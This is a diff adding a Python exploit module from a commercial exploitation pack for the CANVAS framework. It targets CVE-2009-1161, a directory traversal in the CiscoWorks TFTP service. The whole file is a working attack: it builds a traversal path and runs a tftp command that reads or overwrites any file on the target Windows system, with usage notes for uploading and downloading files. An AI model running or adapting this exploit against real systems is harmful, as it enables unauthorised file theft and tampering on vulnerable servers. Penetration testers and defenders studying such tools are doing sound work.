@@ -1,0 +1,137 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+import os
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from encoder import alphanumeric
+
+
+# GUI info
+NAME = "CiscoWorks TFTP Directory Traversal Vulnerability"
+
+DESCRIPTION = "Directory Traversal Vulnerability in CiscoWorks TFTP"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "Cisco"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2009.05.20"
+DOCUMENTATION["References"] = "http://www.cisco.com/warp/public/707/cisco-sa-20090520-cw.shtml"
+DOCUMENTATION["Versions Affected"] = "CiscoWorks Common Services versions 3.0.x - 3.1.x - 3.2.x"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2009-1161"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1161"
+DOCUMENTATION["Notes"] = """
+Use <files> directory available in d2sec_ciscotftp for file transfer (upload and download)
+You can read or overwrite any file you want on the target Windows system.
+
+Example from Windows: 
+ TFTP binary: tftp.exe
+ Without Upload
+  TFTP parameters: GET
+ With Ppload
+  TFTP parameters: PUT
+  
+Example from Linux: 
+ TFTP binary: tftp
+ Without Upload
+  TFTP parameters: -c get
+ With Ppload
+  TFTP parameters: -c put
+
+This exploit will updated when tftp python library will be abble to manage TFTP download and upload.
+"""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.tftpbin = "tftp"
+        self.filesrc = ""
+        self.filedst = ""
+        self.modeopt = ""
+        self.upload = 0
+        self.path = "D2/...//...//...//...//...//...//"
+        self.name = NAME       
+        self.port = 69
+        return
+
+
+    def run(self):
+       	local_dir = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_ciscotftp/files/"
+    		    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+        self.filesrc = self.argsDict.get("src", self.filesrc)
+        self.filedst = self.argsDict.get("dst", self.filedst)
+        self.upload = int(self.argsDict.get("upload", self.upload))
+        self.tftpbin = self.argsDict.get("tftp", self.tftpbin)
+        self.modeopt = self.argsDict.get("opt", self.modeopt)
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))                          
+        
+        if (self.tftpbin == "") or (self.modeopt == "") or (self.filesrc == "") or (self.filedst == ""):
+        	self.log("Error: parameter missing")        	
+        	return 0
+        
+        if self.upload:        	
+        	self.src = local_dir + self.filesrc        	        		
+        	self.dst = self.path + self.filedst
+        else:        	
+        	self.src = self.path + self.filesrc
+        	self.dst = local_dir + self.filedst
+        	        
+        tftp_cmd = self.tftpbin + " " + self.host + " " + self.modeopt + " " + self.src + " " + self.dst
+        
+        self.log("TFTP command: " + tftp_cmd)
+        
+        p = os.popen2(tftp_cmd)
+        self.log(p[1].read())
+        
+        return 1
+                             		
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -O tftp:tftp_bin -O upload:0|1 -O opt:tftp_option -O src:pathfile_src -O dst:pathfile_dst \n" % (sys.argv[0])    	
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
